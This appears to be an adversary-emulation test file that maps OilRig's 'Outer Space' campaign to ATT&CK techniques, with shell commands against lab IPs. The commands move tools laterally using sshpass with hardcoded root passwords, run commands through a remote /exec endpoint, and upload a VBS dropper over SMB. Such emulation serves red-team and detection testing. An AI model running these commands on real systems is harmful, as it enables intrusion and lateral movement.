name: T1105 - Ingress Tool Transfer
description: During Outer Space, OilRig downloaded additional tools to comrpomised infrastructure.

executors.name: sh
executors.command: sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@172.21.0.20:/tmp/wget && sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/wget root@172.22.0.20:/tmp/wget'

name: T1584.004 - Server
description: During Outer Space, OilRig compromised an Israeli human resources site to use as a C2 server.

name: T1217 - Browser Information Discovery
description: During Outer Space, OilRig used a Chrome data dumper named MKG.

name: T1071.001 - Web Protocols
description: During Outer Space, OilRig used HTTP to communicate between installed backdoors and compromised servers including via the Microsoft Exchange Web Services API.

name: T1585.003 - Cloud Accounts
description: During Outer Space, OilRig created M365 email accounts to be used as part of C2.

executors.name: sh
executors.command: sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'python3 -c "import sys; print(\"Commands to send and receive malicious emails here.\")"'

name: T1027.013 - Encrypted/Encoded File
description: During Outer Space, OilRig deployed VBS droppers with obfuscated strings.

name: T1587.001 - Malware
description: For Outer Space, OilRig created new implants including the Solar backdoor.

executors.name: sh
executors.command: curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec && curl -X POST -F 'cmd=uname -a' http://172.21.0.20:5055/exec

name: T1059.005 - Visual Basic
description: During Outer Space, OilRig used VBS droppers to deploy malware.

executors.name: sh
executors.command:
rm -f /tmp/vb.vbs && printf 'Set objNetwork = CreateObject("WScript.Network")
strComputer = "%s"
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c dir \\172.21.0.20\share\test.txt > C:\Windows\Temp\out.txt", 0, True
' 172.21.0.20 > /tmp/vb.vbs && smbclient \\172.21.0.20\share -U DebianUser%DebianUser -c 'put /tmp/vb.vbs vb.vbs' && rpcclient 172.21.0.20 -U DebianUser%DebianUser -c 'srvsvc' && echo 'Executed VBScript upload and remote file access on 172.21.0.20'
